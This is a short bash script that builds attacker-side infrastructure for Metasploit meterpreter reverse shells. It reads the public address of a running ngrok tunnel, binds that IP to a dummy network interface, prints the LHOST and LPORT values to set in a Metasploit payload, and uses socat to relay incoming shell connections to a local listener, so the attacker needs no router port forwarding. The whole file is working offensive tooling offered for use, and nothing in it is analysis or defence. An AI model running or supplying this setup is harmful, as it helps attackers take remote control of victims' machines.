#!/bin/bash
#Author : Abyss Watcher

echo 'This script will allow you to get meterpreter sessions without port forwarding your router.
Just launch ngrok in another terminal and pass the local port as first parameter of this script.
Usage : meterpreter_ngrok.sh local_port_used_by_ngrok dummy_interface_name (optional). Ex: meterpreter_ngrok.sh 4444 ethngrok'

check_packet_presence() {
    arr=("$@")
    for packet in "${arr[@]}"; do
        dpkg -s "$packet" &>/dev/null || {
            echo "$packet packet not found ! Installing it..."
            sudo apt-get install -y "$packet"
        }
    done
}

packet_list=("jq" "socat" "curl")

check_packet_presence "${packet_list[@]}"

#Get ngrok public url from localhost and parse the json result
get_ngrok_public_url=$(curl -s 127.0.0.1:4040/api/tunnels | jq '.tunnels[0]."public_url"')

#Exit if ngrok is not launched (empty curl output)
if [ -z "$get_ngrok_public_url" ]; then
    echo "ngrok does not seem to be running..." && exit
fi

#Parse values from json with regex
ngrok_hostname=$(echo $get_ngrok_public_url | grep -oe '[0-9]\{1,2\}[.]tcp[.].\+[.]ngrok[.]io')
ngrok_ip=$(dig +short $ngrok_hostname)
ngrok_port=$(echo $get_ngrok_public_url | grep -oe '[0-9]\{4,5\}')

#Get parameters
local_port=${1?"Please specify the local ngrok port as first parameter."}
int_name=${2:-dummyeth}

#Create dummy interface and launch socat binder. Delete dummy interface on exit.
sudo ip link add "$int_name" type dummy
sudo ip link set "$int_name" up &&
    sudo ip addr add "$ngrok_ip"/24 dev "$int_name" &&
    echo -e "\nMetasploit payload commands :\nset LHOST $ngrok_ip\nset LPORT $ngrok_port" &&
    sudo socat TCP-LISTEN:"$local_port",fork TCP:"$ngrok_ip":"$ngrok_port"
sudo ip link del "$int_name"
